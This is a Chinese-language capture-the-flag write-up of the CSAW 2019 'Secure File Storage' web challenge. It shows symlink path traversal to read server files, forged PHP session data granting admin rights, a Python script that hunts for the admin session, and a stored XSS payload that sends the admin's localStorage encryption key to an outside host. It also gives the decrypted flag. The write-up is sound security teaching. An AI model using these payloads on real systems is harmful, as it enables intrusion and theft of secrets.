# Secure File Storage

從client.py可以看到很多API endpoint

其中symlink可以讓我們往上層目錄跳:

`http://web.chal.csaw.io:1001/api/v1/file/symlink` + `path=b/&target=../../../../../../../`

接著就可以任意讀寫檔了:

`http://web.chal.csaw.io:1001/api/v1/file/read` + `path=b/etc/passwd`

<br>

把Source Code讀出來之後，可以看到權限是用數字表示，15代表admin權限

所以我們只要把Session中的對應`priv`欄位改成15，就能變成admin

`current_user|O:4:"User":4:{s:8:"username";s:6:"kaibro";s:8:"password";s:60:"$2y$10$lHFCkKo5jF1J/AXDXB8ju.PdbTDwIaR2FVcREssi8hci4DledTHfb";s:5:"privs";s:1:"3";s:2:"id";s:3:"769";}`

之後就可以列目錄，和訪問`/admin`

其中`/tmp/user_data/flag.txt`為加密過後的flag

`U2FsdGVkX18vg7gzzc/Q2XG2O5vpgFvBvX7nv4mLxfsuKQxvSrMjHu11kDPfUIYVtJ9b5ohVP7olboQV5MDOjQ==`

加密方法在`/template/home.php`:

```javascript
if (localStorage.encryptSecret === undefined) {
    var secret = new Uint8Array(32);
    window.crypto.getRandomValues(secret);
    localStorage.encryptSecret = btoa(String.fromCharCode.apply(null, secret));
}
$("#uploadForm").submit(function(e) {
    e.preventDefault();
    var f = $("#file")[0].files[0];
    if (!f) {
        alert("You must select a file!");
    } else {
        var fr = new FileReader();
        var fn = f.name;
        fr.onload = function(file) {
            var ciphertext = CryptoJS.AES.encrypt(fr.result, atob(localStorage.encryptSecret)).toString();
            $.post({
                url: "/api/v1/file/edit",
                data: {path: fn, content: btoa(ciphertext)}
            }).done(function() {
                location.reload();
            });
        };
        fr.readAsText(f);
    }
});
```

加上從cmdline可以翻到`/usr/bin/node /admin/client.js`和`puppeteer`

代表key存放在admin的`localStorage`，然後我們要XSS偷出來

認真讀一下Code會發現，admin一定會訪問的只有`template/admin.php`和`template/admin_user.php`

其中只有`<h1>Welcome <?php echo $current_user->username; ?></h1>`是比較有機會做XSS的

但DB沒辦法Injection

能搞事的地方只有Session

寫個腳本找一下admin的session:

```python
import requests
import json

cookie={'PHPSESSID': 'maaca3mgclmdcn9hvr029u25b7'}
r = requests.post("http://web.chal.csaw.io:1001/api/v1/file/list", data={'path': 'a/tmp/'}, cookies=cookie)

res = (json.loads(r.text))

for i in res['data']:
    if i[0:4] == 'sess':
        print(i)
        rrr = requests.post("http://web.chal.csaw.io:1001/api/v1/file/read", data={'path':"a/tmp/{}".format(i)}, cookies=cookie)
        if "admin" in rrr.text:
            print "found!"
            break
```

最後找到`sess_4umud1lupqn0mpibor27r283o1`

接著就塞XSS Payload進去他的`name`，下次訪問時，就會被XSS

`http://web.chal.csaw.io:1001/api/v1/file/edit`

`path=a/tmp/sess_4umud1lupqn0mpibor27r283o1&content=current_user|O:4:"User":4:{s:8:"username";s:123:"<img src=x onerror=eval(document.location=atob('aHR0cDovL2thaWJyby50dy9zZWNyZXQ9Cg==').concat(localStorage.encryptSecret))>";s:8:"password";s:60:"$2y$10$H38hS7IMk1MzSg/usdBvjuRucRGkEKrc/tJhJQOD7249oRpNqWc5O";s:5:"privs";s:2:"15";s:2:"id";s:1:"1";}`

多塞幾次，就會收到帶有key的Request回來:

`216.165.2.60 - - [15/Sep/2019:17:26:50 +0000] "GET /secret=wvEXTzNpd5xPostMnBqsqHzfz7Ns1yjqL9kwsuAx4ds= HTTP/1.1" 404 488 "http://localhost/admin" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/72.0.3582.0 Safari/537.36"`

最後用CryptoJS去解密:

`CryptoJS.AES.decrypt("U2FsdGVkX18vg7gzzc/Q2XG2O5vpgFvBvX7nv4mLxfsuKQxvSrMjHu11kDPfUIYVtJ9b5ohVP7olboQV5MDOjQ==", atob("wvEXTzNpd5xPostMnBqsqHzfz7Ns1yjqL9kwsuAx4ds="))`

=> `flag{fddb53d704808cb859862d3eb9e9609bae3711bb}`

